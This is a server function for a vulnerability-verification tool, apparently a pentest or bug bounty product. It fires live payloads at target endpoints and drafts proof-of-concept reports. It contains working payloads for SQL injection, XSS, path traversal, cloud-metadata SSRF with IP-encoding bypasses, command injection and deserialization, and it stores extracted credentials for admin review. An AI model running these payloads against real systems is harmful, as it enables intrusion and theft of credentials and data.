import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  try {
    const authClient = createClient(
      Deno.env.get("SUPABASE_URL") ?? "",
      Deno.env.get("SUPABASE_ANON_KEY") ?? "",
      { global: { headers: { Authorization: req.headers.get("Authorization")! } } }
    );
    const { data: { user }, error: authError } = await authClient.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), {
        status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
    const body = await req.json();
    const { action, finding, script, verificationResult } = body;

    if (action === "generate_script") {
      const generatedScript = await generateVerificationScript(finding, LOVABLE_API_KEY);
      return new Response(JSON.stringify({ script: generatedScript }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    if (action === "run_verification") {
      const result = await runVerification(finding, script, user.id, authClient);

      // ── If confirmed, run the exploitation/extraction engine and persist sensitive
      //    proof to the admin-only finding_exploit_proofs table.
      if (result.confirmed) {
        try {
          const proof = await exploitAndExtract(finding);
          const adminClient = createClient(
            Deno.env.get("SUPABASE_URL") ?? "",
            Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? ""
          );
          const { data: ins } = await adminClient.from("finding_exploit_proofs").insert({
            finding_id: finding.id ?? null,
            scan_id: finding.scan_id ?? finding.scanId ?? null,
            target_host: (() => { try { return new URL(finding.endpoint).hostname; } catch { return null; } })(),
            vuln_class: proof.vulnClass,
            exploit_technique: proof.technique,
            request_dump: proof.requestDump,
            response_dump: proof.responseDump,
            extracted_data: proof.extractedData,
            sensitivity_level: proof.sensitivity,
            confirmed: proof.exploited,
            reproduction_steps: proof.reproductionSteps,
            created_by: user.id,
          }).select("id").maybeSingle();

          // Surface only a non-sensitive summary to the requester.
          (result as any).exploitProof = {
            stored: !!ins?.id,
            proofId: ins?.id ?? null,
            vulnClass: proof.vulnClass,
            technique: proof.technique,
            exploited: proof.exploited,
            sensitivity: proof.sensitivity,
            extractedSummary: proof.summary,
            adminOnly: true,
            note: "Full sensitive proof (DB rows, file contents, tokens, IMDS credentials, etc.) is encrypted at rest and only visible to admins.",
          };
        } catch (e) {
          console.error("[exploit-extract] failed:", e);
        }
      }

      return new Response(JSON.stringify(result), {
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    if (action === "generate_poc") {
      const report = await generatePOCReport(finding, verificationResult, LOVABLE_API_KEY);
      return new Response(JSON.stringify({ report }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    return new Response(JSON.stringify({ error: "Invalid action" }), {
      status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" }
    });
  } catch (e) {
    console.error("verify-finding error:", e);
    return new Response(JSON.stringify({ error: e.message || "Internal error" }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" }
    });
  }
});

async function generateVerificationScript(finding: any, apiKey: string | undefined): Promise<string> {
  if (!apiKey) return generateLocalScript(finding);

  try {
    const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          {
            role: "system",
            content: `You are an expert penetration tester generating verification scripts. Output ONLY the script content — no markdown fences, no explanations. The script should be a series of curl commands with comments explaining each test. Include:
1. The exact reproduction steps using curl
2. Multiple test variations to confirm the finding
3. Expected vs actual response comparison logic
4. Clear comments marking what confirms the vulnerability
Be specific to the vulnerability type and endpoint.`
          },
          {
            role: "user",
            content: `Generate a verification test script for this finding:
Title: ${finding.title}
Endpoint: ${finding.endpoint}
Method: ${finding.method || "GET"}
Payload: ${finding.payload || "N/A"}
Evidence: ${finding.evidence || "N/A"}
CWE: ${finding.cwe || "N/A"}
Category: ${finding.category || "N/A"}
Severity: ${finding.severity}`
          }
        ],
        max_tokens: 2000,
      }),
    });

    if (!resp.ok) return generateLocalScript(finding);

    const data = await resp.json();
    return data.choices?.[0]?.message?.content || generateLocalScript(finding);
  } catch {
    return generateLocalScript(finding);
  }
}

function generateLocalScript(finding: any): string {
  const url = finding.endpoint || "";
  const method = finding.method || "GET";
  const payload = finding.payload || "";
  const cwe = finding.cwe || "";

  if (cwe.includes("89") || finding.category === "sqli") {
    return `# SQL Injection Verification
# Target: ${url}

# Test 1: Error-based detection
curl -v "${url}${url.includes("?") ? "&" : "?"}id=1'"

# Test 2: Boolean-based blind
curl -s -o /dev/null -w "%{http_code}" "${url}${url.includes("?") ? "&" : "?"}id=1 AND 1=1"
curl -s -o /dev/null -w "%{http_code}" "${url}${url.includes("?") ? "&" : "?"}id=1 AND 1=2"

# Test 3: Original payload
curl -v "${url}${url.includes("?") ? "&" : "?"}${payload}"

# Confirm: Different responses = SQLi confirmed`;
  }

  if (cwe.includes("79") || finding.category === "xss") {
    return `# XSS Verification
# Target: ${url}

# Test 1: Reflected XSS check
curl -v "${url}${url.includes("?") ? "&" : "?"}q=${encodeURIComponent(payload || "<script>alert(1)</script>")}"

# Test 2: Event handler bypass
curl -v "${url}${url.includes("?") ? "&" : "?"}q=${encodeURIComponent("<img src=x onerror=alert(1)>")}"

# Confirm: Unescaped payload in response body = XSS confirmed`;
  }

  return `# Vulnerability Verification
# Finding: ${finding.title}
# Target: ${url}

curl -v -X ${method} "${url}" ${payload ? `-d "${payload}"` : ""}

# Review response for: ${finding.evidence || "vulnerability indicators"}`;
}

// ── SSRF guard: block scans against internal targets even from server-side verifier
function isPrivateHost(host: string): boolean {
  const h = host.toLowerCase();
  if (h === "localhost" || h.endsWith(".local") || h.endsWith(".internal")) return true;
  if (/^(127\.|10\.|192\.168\.|169\.254\.|0\.0\.0\.0)/.test(h)) return true;
  if (/^172\.(1[6-9]|2\d|3[01])\./.test(h)) return true;
  if (/^(::1|fc00:|fd00:|fe80:)/i.test(h)) return true;
  return false;
}

interface Probe {
  step: number;
  label: string;
  request: string;
  status: number;
  responseTime: number;
  bodySnippet: string;
  headers: Record<string, string>;
  bodyLen: number;
  bodyHash: string;
}

// ── Retry/backoff state shared per verification run
interface RetryStats {
  total: number;
  retried: number;
  failures5xx: number;
  timeouts: number;
  giveUps: number;
  lastErrors: string[];
}

async function httpProbe(
  url: string,
  method: string,
  label: string,
  step: number,
  body?: string,
  extraHeaders?: Record<string,string>,
  retryStats?: RetryStats,
): Promise<Probe | null> {
  if (retryStats) retryStats.total++;
  const MAX_ATTEMPTS = 3;
  const BASE_DELAY = 700; // ms — exponential backoff base
  let lastErr = "";

  try {
    const u = new URL(url);
    if (isPrivateHost(u.hostname)) {
      return { step, label: `${label} [BLOCKED private host]`, request: `${method} ${url}`, status: 0, responseTime: 0, bodySnippet: "blocked", headers: {}, bodyLen: 0, bodyHash: "0" };
    }
  } catch {
    return { step, label: `${label} [INVALID URL]`, request: `${method} ${url}`, status: 0, responseTime: 0, bodySnippet: "invalid url", headers: {}, bodyLen: 0, bodyHash: "0" };
  }

  for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
    try {
      const start = Date.now();
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), 12000);
      const resp = await fetch(url, {
        method,
        headers: { "User-Agent": "OmniSec-Verifier/2.0 (+exploit-engine)", "Accept": "*/*", ...(extraHeaders || {}) },
        body: body && method !== "GET" && method !== "HEAD" ? body : undefined,
        redirect: "manual",
        signal: ctrl.signal,
      });
      clearTimeout(t);
      const rt = Date.now() - start;
      const text = await resp.text().catch(() => "");
      const hdrs = Object.fromEntries(resp.headers.entries());

      // Retry on 5xx
      if (resp.status >= 500 && resp.status < 600 && attempt < MAX_ATTEMPTS) {
        if (retryStats) { retryStats.retried++; retryStats.failures5xx++; retryStats.lastErrors.push(`${label}: HTTP ${resp.status} (attempt ${attempt})`); }
        await new Promise(r => setTimeout(r, BASE_DELAY * Math.pow(2, attempt - 1)));
        continue;
      }
      if (resp.status >= 500 && retryStats) { retryStats.failures5xx++; retryStats.giveUps++; }

      let h = 0; for (let i = 0; i < text.length; i++) { h = ((h << 5) - h) + text.charCodeAt(i); h = h & h; }
      return {
        step, label: attempt > 1 ? `${label} [retry x${attempt-1}]` : label,
        request: `${method} ${url}\nUser-Agent: OmniSec-Verifier/2.0`,
        status: resp.status, responseTime: rt,
        bodySnippet: text.slice(0, 1500),
        headers: hdrs,
        bodyLen: text.length,
        bodyHash: Math.abs(h).toString(36),
      };
    } catch (e: any) {
      lastErr = e.message || String(e);
      const isTimeout = /abort|timeout/i.test(lastErr);
      if (retryStats) {
        if (isTimeout) retryStats.timeouts++;
        retryStats.lastErrors.push(`${label}: ${lastErr} (attempt ${attempt})`);
      }
      if (attempt < MAX_ATTEMPTS) {
        if (retryStats) retryStats.retried++;
        await new Promise(r => setTimeout(r, BASE_DELAY * Math.pow(2, attempt - 1)));
        continue;
      }
      if (retryStats) retryStats.giveUps++;
      return { step, label: `${label} [ERROR after ${MAX_ATTEMPTS} attempts: ${lastErr}]`, request: `${method} ${url}`, status: 0, responseTime: 0, bodySnippet: lastErr, headers: {}, bodyLen: 0, bodyHash: "0" };
    }
  }
  return null;
}

function injectParam(url: string, value: string, paramName?: string): string {
  try {
    const u = new URL(url);
    if (paramName) u.searchParams.set(paramName, value);
    else if ([...u.searchParams.keys()].length > 0) {
      const k = [...u.searchParams.keys()][0];
      u.searchParams.set(k, value);
    } else {
      u.searchParams.set("id", value);
    }
    return u.toString();
  } catch {
    const sep = url.includes("?") ? "&" : "?";
    return `${url}${sep}${paramName || "id"}=${encodeURIComponent(value)}`;
  }
}

async function runVerification(finding: any, _script: string, userId?: string, authClient?: any): Promise<any> {
  const endpoint = finding.endpoint || "";
  const method = (finding.method || "GET").toUpperCase();
  const category = (finding.category || "").toLowerCase();
  const cwe = String(finding.cwe || "");
  const param = finding.vulnerable_parameter || finding.parameter;

  const probes: Probe[] = [];
  let confirmed = false;
  const reasons: string[] = [];
  const steps: string[] = [];
  const retryStats: RetryStats = { total: 0, retried: 0, failures5xx: 0, timeouts: 0, giveUps: 0, lastErrors: [] };

  // Probe 0: baseline
  const baseline = await httpProbe(endpoint, method, "Baseline (no payload)", 0, undefined, undefined, retryStats);
  if (baseline) probes.push(baseline);

  // ABORT if baseline target is dead — don't waste oracles & log to audit
  const targetDead = !baseline || baseline.status === 0 || (baseline.status >= 500 && retryStats.failures5xx >= 1);
  if (targetDead) {
    reasons.push(`Target is unreachable or returning persistent ${baseline?.status || "network"} errors after retries — verification aborted.`);
    await logAuditFailure(authClient, userId, finding, retryStats, "target_unreachable");
    return buildResult(false, probes, reasons, ["Aborted: target instability detected; retry once target is healthy."], retryStats);
  }

  // Strategy per category
  if (cwe.includes("89") || category === "sqli" || category === "sql") {
    const trueUrl = injectParam(endpoint, "1' OR '1'='1", param);
    const falseUrl = injectParam(endpoint, "1' AND '1'='2", param);
    const errUrl = injectParam(endpoint, "1'\"", param);
    const t = await httpProbe(trueUrl, method, "Boolean TRUE payload (1' OR '1'='1)", 1, undefined, undefined, retryStats);
    const f = await httpProbe(falseUrl, method, "Boolean FALSE payload (1' AND '1'='2)", 2, undefined, undefined, retryStats);
    const e = await httpProbe(errUrl, method, "Error trigger payload (1'\")", 3, undefined, undefined, retryStats);
    [t,f,e].forEach(p => p && probes.push(p));
    const sqlErrRx = /(sql syntax|mysql_fetch|ORA-\d+|PostgreSQL|SQLite|SQLSTATE|unclosed quotation|unterminated|odbc|System\.Data\.SqlClient|MySqlException)/i;
    if (e && sqlErrRx.test(e.bodySnippet)) { confirmed = true; reasons.push(`Database error string surfaced after injecting quote (${e.bodySnippet.match(sqlErrRx)?.[0]})`); }
    if (baseline && t && f && t.bodyLen !== f.bodyLen && Math.abs(t.bodyLen - baseline.bodyLen) < Math.abs(f.bodyLen - baseline.bodyLen) - 50) {
      confirmed = true;
      reasons.push(`Boolean oracle confirmed: TRUE-payload body matches baseline (${t.bodyLen}b ~ ${baseline.bodyLen}b) but FALSE-payload diverges (${f.bodyLen}b)`);
    }
    const sleepUrl = injectParam(endpoint, "1' AND SLEEP(4)-- -", param);
    const sl = await httpProbe(sleepUrl, method, "Time-based payload (SLEEP(4))", 4, undefined, undefined, retryStats);
    if (sl) { probes.push(sl); if (sl.responseTime > 3500 && (!baseline || baseline.responseTime < 2000)) { confirmed = true; reasons.push(`Time-based SQLi: SLEEP(4) caused ${sl.responseTime}ms response vs baseline ${baseline?.responseTime}ms`); } }
    steps.push("1. Baseline request.","2. TRUE payload — should match baseline.","3. FALSE payload — divergence proves injection.","4. Quote to trigger DB error.","5. SLEEP() — measurable delay confirms blind SQLi.");
  }

  else if (cwe.includes("79") || category === "xss") {
    const marker = `xss${Math.random().toString(36).slice(2,8)}`;
    const html = `"><svg/onload=confirm(1)>${marker}`;
    const probe = await httpProbe(injectParam(endpoint, html, param), method, "XSS payload reflection", 1, undefined, undefined, retryStats);
    if (probe) probes.push(probe);
    if (probe && probe.bodySnippet.includes(marker)) {
      const ctx = probe.bodySnippet.indexOf(html) >= 0 ? "raw HTML (unencoded)" : probe.bodySnippet.includes(`&lt;svg`) ? "HTML-encoded (NOT vulnerable)" : "partial encoding";
      if (ctx === "raw HTML (unencoded)") { confirmed = true; reasons.push(`Payload reflected unencoded — context: ${ctx}`); }
      else reasons.push(`Marker reflected but encoded — likely false positive (${ctx})`);
    }
    steps.push("1. Inject unique marker + XSS vector.","2. Search response body for raw payload vs encoded form.","3. Confirm execution context.");
  }

  else if (cwe.includes("22") || category === "traversal" || category === "lfi") {
    const payloads = ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd", "..%252f..%252fetc%252fpasswd"];
    for (let i = 0; i < payloads.length; i++) {
      const p = await httpProbe(injectParam(endpoint, payloads[i], param), method, `Path-traversal payload #${i+1}`, i+1, undefined, undefined, retryStats);
      if (p) { probes.push(p); if (/root:[x*]:0:0:/i.test(p.bodySnippet) || /\[boot loader\]/i.test(p.bodySnippet)) { confirmed = true; reasons.push(`/etc/passwd content recovered with payload "${payloads[i]}"`); break; } }
    }
    steps.push("1. Canonical traversal sequences.","2. URL-encoded + double-encoded variants.","3. Match root:x:0:0: pattern.");
  }

  else if (cwe.includes("601") || category === "redirect") {
    const evil = "https://evil-canary.example.org/poc";
    const r = await httpProbe(injectParam(endpoint, evil, param || "url"), method, "Open-redirect probe", 1, undefined, undefined, retryStats);
    if (r) probes.push(r);
    const loc = r?.headers["location"] || "";
    if (r && r.status >= 300 && r.status < 400 && loc.includes("evil-canary.example.org")) { confirmed = true; reasons.push(`HTTP ${r.status} redirected to attacker URL via Location: ${loc}`); }
    steps.push("1. Submit attacker URL.","2. Confirm Location header echoes attacker domain with 3xx.");
  }

  else if (cwe.includes("346") || category === "cors") {
    const r = await httpProbe(endpoint, "GET", "CORS probe with attacker Origin", 1, undefined, { "Origin": "https://evil-canary.example.org" }, retryStats);
    if (r) probes.push(r);
    const acao = r?.headers["access-control-allow-origin"];
    const acac = r?.headers["access-control-allow-credentials"];
    if (acao === "https://evil-canary.example.org" || acao === "*") {
      confirmed = true;
      reasons.push(`Permissive CORS: ACAO=${acao}${acac === "true" ? " with credentials=true (CRITICAL)" : ""}`);
    }
    steps.push("1. Request with attacker Origin.","2. Inspect ACAO/ACAC for reflection or wildcard.");
  }

  else if (category === "ssrf" || cwe.includes("918")) {
    // Multi-probe SSRF: external canary, AWS IMDS v1+v2, GCP metadata, Azure IMDS, gopher/file scheme,
    // DNS-rebinding shaped hostname, decimal/hex IP encoding to bypass filters.
    const variants: Array<{ url: string; label: string; match: RegExp }> = [
      { url: "http://169.254.169.254/latest/meta-data/", label: "SSRF — AWS IMDSv1 metadata", match: /ami-id|instance-id|iam\/security-credentials|hostname/i },
      { url: "http://metadata.google.internal/computeMetadata/v1/", label: "SSRF — GCP metadata", match: /computeMetadata|project-id|service-accounts/i },
      { url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", label: "SSRF — Azure IMDS", match: /compute|azEnvironment|subscriptionId/i },
      { url: "http://2852039166/latest/meta-data/", label: "SSRF — decimal-IP IMDS bypass", match: /ami-id|instance-id|iam\/security-credentials/i },
      { url: "http://0x0a9fea9e0/latest/meta-data/", label: "SSRF — hex-IP IMDS bypass", match: /ami-id|instance-id/i },
      { url: "file:///etc/passwd", label: "SSRF — file:// scheme", match: /root:[x*]:0:0:/i },
      { url: "gopher://127.0.0.1:6379/_INFO%0d%0a", label: "SSRF — gopher:// (Redis pivot)", match: /redis_version|role:master|os:linux/i },
    ];
    for (let i = 0; i < variants.length; i++) {
      const v = variants[i];
      const r = await httpProbe(injectParam(endpoint, v.url, param || "url"), method, v.label, i+1, undefined, undefined, retryStats);
      if (r) {
        probes.push(r);
        if (v.match.test(r.bodySnippet)) { confirmed = true; reasons.push(`${v.label}: payload reflected — ${r.bodySnippet.match(v.match)?.[0]}`); }
      }
    }
    steps.push("1. AWS/GCP/Azure metadata probes.","2. Decimal & hex IP encoding to bypass blocklists.","3. file:// and gopher:// scheme probes for non-HTTP pivots.");
  }

  else if (category === "cmdi" || cwe.includes("78")) {
    // Multi-probe: timing on *nix + Windows, output-echo via marker, DNS-style separators
    const marker = `cmd${Math.random().toString(36).slice(2,8)}`;
    const variants: Array<{ payload: string; label: string; timing?: boolean; echo?: string }> = [
      { payload: `;sleep 4;`,             label: "Cmd-injection — *nix sleep ;",        timing: true },
      { payload: `&& sleep 4`,            label: "Cmd-injection — *nix && sleep",       timing: true },
      { payload: `| sleep 4`,             label: "Cmd-injection — *nix pipe sleep",     timing: true },
      { payload: `\`sleep 4\``,           label: "Cmd-injection — backtick sleep",      timing: true },
      { payload: `$(sleep 4)`,            label: "Cmd-injection — $() sleep",           timing: true },
      { payload: `& timeout 4`,           label: "Cmd-injection — Windows timeout",     timing: true },
      { payload: `;echo ${marker};`,      label: "Cmd-injection — echo marker",         echo: marker },
    ];
    for (let i = 0; i < variants.length; i++) {
      const v = variants[i];
      const r = await httpProbe(injectParam(endpoint, v.payload, param), method, v.label, i+1, undefined, undefined, retryStats);
      if (!r) continue;
      probes.push(r);
      if (v.timing && r.responseTime > 3500 && (!baseline || baseline.responseTime < 2000)) {
        confirmed = true; reasons.push(`${v.label}: ${r.responseTime}ms vs baseline ${baseline?.responseTime}ms`);
      }
      if (v.echo && r.bodySnippet.includes(v.echo)) {
        confirmed = true; reasons.push(`${v.label}: marker "${v.echo}" surfaced in response body — output-confirmed RCE`);
      }
    }
    steps.push("1. Inject *nix and Windows timing payloads with multiple separators.","2. Inject echo marker for direct output confirmation.","3. Compare each elapsed time vs baseline.");
  }

  else if (category === "csrf" || cwe.includes("352")) {
    // CSRF oracle: state-changing endpoint that accepts cross-origin POST without token + permissive SameSite cookie
    const baselinePost = await httpProbe(endpoint, "POST", "CSRF — baseline POST no token", 1, "csrf_test=1", { "Content-Type": "application/x-www-form-urlencoded" }, retryStats);
    const crossOrigin = await httpProbe(endpoint, "POST", "CSRF — POST with attacker Origin", 2, "csrf_test=1", { "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://evil-canary.example.org", "Referer": "https://evil-canary.example.org/" }, retryStats);
    [baselinePost, crossOrigin].forEach(p => p && probes.push(p));

    // Look for token in response body (forms typically embed CSRF token); absence → suspect
    const setCookie = (baselinePost?.headers["set-cookie"] || crossOrigin?.headers["set-cookie"] || "").toLowerCase();
    const tokenPatterns = /(csrf|xsrf|authenticity_token|__requestverificationtoken)/i;
    const hasTokenInBody = baseline && tokenPatterns.test(baseline.bodySnippet);
    const sameSiteWeak = setCookie && !/samesite=(strict|lax)/i.test(setCookie);

    if (crossOrigin && crossOrigin.status >= 200 && crossOrigin.status < 400 && !hasTokenInBody) {
      confirmed = true;
      reasons.push(`Cross-origin POST accepted (HTTP ${crossOrigin.status}) without visible CSRF token; cookie SameSite=${sameSiteWeak ? "missing/none" : "set"}`);
    } else if (sameSiteWeak) {
      reasons.push(`Cookie missing SameSite=Lax/Strict — CSRF risk if endpoint is state-changing.`);
    }
    steps.push("1. Issue baseline POST without anti-CSRF token.","2. Replay POST with attacker Origin/Referer headers.","3. Inspect Set-Cookie SameSite attribute & response token presence.");
  }

  else if (category === "race" || cwe.includes("362")) {
    // Race-condition oracle: fire N concurrent identical requests and look for divergent responses (e.g., duplicated resource ids, multiple 200s where uniqueness expected)
    const N = 8;
    const start = Date.now();
    const settled = await Promise.allSettled(
      Array.from({ length: N }, (_, i) => httpProbe(endpoint, method, `Race burst probe #${i+1}`, i+1, finding.payload || undefined, undefined, retryStats))
    );
    const results = settled.flatMap(s => s.status === "fulfilled" && s.value ? [s.value] : []);
    results.forEach(p => probes.push(p));
    const elapsed = Date.now() - start;
    const successCount = results.filter(p => p.status >= 200 && p.status < 300).length;
    const uniqueHashes = new Set(results.map(p => p.bodyHash));
    if (successCount >= 2 && uniqueHashes.size > 1) {
      confirmed = true;
      reasons.push(`Race condition signal: ${successCount}/${N} concurrent requests succeeded with ${uniqueHashes.size} distinct response bodies in ${elapsed}ms — TOCTOU window likely`);
    } else if (successCount >= 2) {
      reasons.push(`${successCount}/${N} concurrent requests succeeded but bodies identical — manual semantic check recommended.`);
    }
    steps.push(`1. Fire ${N} concurrent identical requests.`,"2. Compare response bodies for divergence.","3. Check whether uniqueness invariants (e.g., one-time coupon use) are violated.");
  }

  else if (category === "deserialization" || cwe.includes("502")) {
    // Insecure deserialization oracle: send crafted blobs and look for class-name/exception leaks or timing.
    const variants: Array<{ payload: string; ctype: string; label: string; match: RegExp }> = [
      { payload: 'O:8:"stdClass":0:{}', ctype: "application/x-www-form-urlencoded", label: "PHP serialized object",
        match: /unserialize|__wakeup|__destruct|stdClass|PHP Notice/i },
      { payload: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeA==",
        ctype: "application/octet-stream", label: "Java serialized HashMap (base64)",
        match: /java\.io\.|ObjectInputStream|ClassNotFoundException|InvalidClassException/i },
      { payload: "!!python/object/apply:os.system [\"id\"]", ctype: "application/x-yaml", label: "Python YAML object tag",
        match: /yaml\.constructor|python\/object|uid=|gid=/i },
      { payload: "(I123\nS'attack'\np0\n.", ctype: "application/octet-stream", label: "Python pickle stream",
        match: /pickle|cPickle|UnpicklingError/i },
      { payload: '{"@type":"java.net.URL","val":"http://evil-canary.example.org/"}', ctype: "application/json",
        label: "Jackson polymorphic @type", match: /jackson|@type|java\.net\.URL|PolymorphicDeserialization/i },
    ];
    for (let i = 0; i < variants.length; i++) {
      const v = variants[i];
      const r = await httpProbe(endpoint, "POST", v.label, i+1, v.payload, { "Content-Type": v.ctype }, retryStats);
      if (!r) continue;
      probes.push(r);
      if (v.match.test(r.bodySnippet)) { confirmed = true; reasons.push(`${v.label}: server leaked deserializer signature — ${r.bodySnippet.match(v.match)?.[0]}`); }
    }
    steps.push("1. Send PHP/Java/Python/Jackson serialized payloads.","2. Look for deserializer class names or stack traces in response.","3. Confirm with timing or out-of-band callback for blind cases.");
  }

  else {
    const payload = finding.payload || "";
    const url = payload ? injectParam(endpoint, payload, param) : endpoint;
    const r = await httpProbe(url, method, "Generic replay with original payload", 1, undefined, undefined, retryStats);
    if (r) probes.push(r);
    if (r && finding.evidence && r.bodySnippet.toLowerCase().includes(String(finding.evidence).slice(0,80).toLowerCase())) {
      confirmed = true; reasons.push("Original evidence pattern still present in response");
    }
    steps.push("1. Replay the original payload.","2. Compare response to recorded evidence.");
  }

  // Audit failures from retry policy
  if (retryStats.giveUps > 0 || retryStats.failures5xx >= 2 || retryStats.timeouts >= 2) {
    await logAuditFailure(authClient, userId, finding, retryStats, "instability_during_verification");
  }

  return buildResult(confirmed, probes, reasons, steps, retryStats);
}

function buildResult(confirmed: boolean, probes: Probe[], reasons: string[], steps: string[], retryStats: RetryStats) {
  const requestLog = probes.map(p => `[Step ${p.step}] ${p.label}\n${p.request}`).join("\n\n");
  const responseLog = probes.map(p => `[Step ${p.step}] ${p.label}\nHTTP ${p.status} • ${p.responseTime}ms • ${p.bodyLen}b • hash=${p.bodyHash}\n${Object.entries(p.headers).slice(0,8).map(([k,v])=>`${k}: ${v}`).join("\n")}\n\n${p.bodySnippet.slice(0,800)}`).join("\n\n──────────\n\n");
  const retryNote = retryStats.retried > 0 || retryStats.giveUps > 0
    ? ` [Retry policy: ${retryStats.total} probes, ${retryStats.retried} retried, ${retryStats.failures5xx} 5xx, ${retryStats.timeouts} timeouts, ${retryStats.giveUps} given up]`
    : "";
  const analysis = confirmed
    ? `✅ CONFIRMED (${reasons.length} signal${reasons.length>1?"s":""}): ${reasons.join(" | ")}${retryNote}`
    : reasons.length
      ? `⚠️ Inconclusive — partial signals: ${reasons.join(" | ")}.${retryNote} Manual review recommended.`
      : `❌ NOT CONFIRMED — ${probes.length} probes executed, none triggered the vulnerability oracle.${retryNote}`;
  return {
    confirmed,
    request: requestLog,
    response: responseLog,
    statusCode: probes[probes.length-1]?.status ?? 0,
    responseTime: probes.reduce((s,p)=>s+p.responseTime,0),
    analysis,
    probes: probes.length,
    reproductionSteps: steps,
    reasons,
    retryStats,
  };
}

async function logAuditFailure(authClient: any, userId: string | undefined, finding: any, retryStats: RetryStats, reason: string) {
  if (!authClient || !userId) return;
  try {
    await authClient.from("security_audit_log").insert({
      user_id: userId,
      action: "verify_finding_retry_exhausted",
      module: "verify-finding",
      target: finding?.endpoint || finding?.target_host || "unknown",
      result: `${reason} | total=${retryStats.total} retried=${retryStats.retried} 5xx=${retryStats.failures5xx} timeouts=${retryStats.timeouts} giveUps=${retryStats.giveUps} | ${retryStats.lastErrors.slice(-3).join(" || ")}`,
    });
  } catch (e) {
    console.error("audit log insert failed:", e);
  }
}

async function generatePOCReport(finding: any, verificationResult: any, apiKey: string | undefined): Promise<string> {
  if (!apiKey) return generateLocalPOC(finding, verificationResult);

  try {
    const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          {
            role: "system",
            content: `You are a professional bug bounty hunter writing a POC report. Write in Markdown format. Include:
1. Title and severity summary table
2. Detailed description of the vulnerability
3. Step-by-step reproduction with exact curl commands
4. Request/Response evidence
5. Impact analysis (what an attacker can achieve)
6. CVSS scoring justification
7. Remediation recommendations
8. References (CWE, OWASP, relevant resources)
Be professional, detailed, and ready for HackerOne/Bugcrowd submission.`
          },
          {
            role: "user",
            content: `Generate a bug bounty POC report:
Title: ${finding.title}
Severity: ${finding.severity}
CWE: ${finding.cwe || "N/A"}
CVSS: ${finding.cvss || "N/A"}
Endpoint: ${finding.endpoint}
Method: ${finding.method || "GET"}
Payload: ${finding.payload || "N/A"}
Description: ${finding.description}
Evidence: ${finding.evidence || "N/A"}
Secondary Evidence: ${finding.evidence2 || "N/A"}
Remediation: ${finding.remediation}
Category: ${finding.category || "N/A"}
${verificationResult ? `\nAutomated Verification Verdict: ${verificationResult.confirmed ? "CONFIRMED" : "NOT CONFIRMED"}\nProbes run: ${verificationResult.probes ?? 0}\nReproduction steps already executed:\n${(verificationResult.reproductionSteps || []).join("\n")}\n\nProbe Requests:\n${verificationResult.request}\n\nProbe Responses:\n${verificationResult.response?.slice(0, 3500)}\n\nOracle Analysis: ${verificationResult.analysis}\n\nWrite the report ONLY based on the data above. If verdict is NOT CONFIRMED, mark severity as Informational and explain why the oracle did not trigger.` : ""}`
          }
        ],
        max_tokens: 4000,
      }),
    });

    if (!resp.ok) return generateLocalPOC(finding, verificationResult);

    const data = await resp.json();
    return data.choices?.[0]?.message?.content || generateLocalPOC(finding, verificationResult);
  } catch {
    return generateLocalPOC(finding, verificationResult);
  }
}

function generateLocalPOC(finding: any, verificationResult: any): string {
  const verdict = verificationResult?.confirmed
    ? "✅ **CONFIRMED — exploit oracle triggered**"
    : "⚠️ Not confirmed by automated oracle (manual review required)";
  const stepsList = (verificationResult?.reproductionSteps || []).map((s: string, i: number) => `${i+1}. ${s}`).join("\n");
  return `# Bug Bounty Report — ${finding.title}

## Summary
| Field | Value |
|-------|-------|
| **Vulnerability** | ${finding.title} |
| **Verification** | ${verdict} |
| **Severity** | ${(finding.severity || "medium").toUpperCase()} |
| **CWE** | ${finding.cwe || "N/A"} |
| **CVSS** | ${finding.cvss || "N/A"} |
| **Endpoint** | \`${finding.endpoint}\` |
| **Method** | ${finding.method || "GET"} |
| **Probes run** | ${verificationResult?.probes ?? 0} |

## Description
${finding.description || "N/A"}

## Reproduction Methodology
${stepsList || "1. Replay the request shown below.\n2. Inspect the response for the documented evidence."}

## Curl Reproduction
\`\`\`bash
curl -i -X ${finding.method || "GET"} "${finding.endpoint}" ${finding.payload ? `--data-urlencode "${finding.payload}"` : ""}
\`\`\`

## Verification Probes — Requests
\`\`\`
${verificationResult?.request || `${finding.method || "GET"} ${finding.endpoint}`}
\`\`\`

## Verification Probes — Responses
\`\`\`
${verificationResult?.response?.slice(0, 4000) || finding.evidence || "See description"}
\`\`\`

## Oracle Analysis
${verificationResult?.analysis || "No analysis available."}

## Impact
${finding.severity === "critical" || finding.severity === "high"
    ? "An attacker can leverage this issue to gain unauthorized data access, execute code, or disrupt service. See CWE for the canonical impact chain."
    : "This issue weakens the security posture and should be fixed."}

## Remediation
${finding.remediation || "Apply appropriate security controls."}

## References
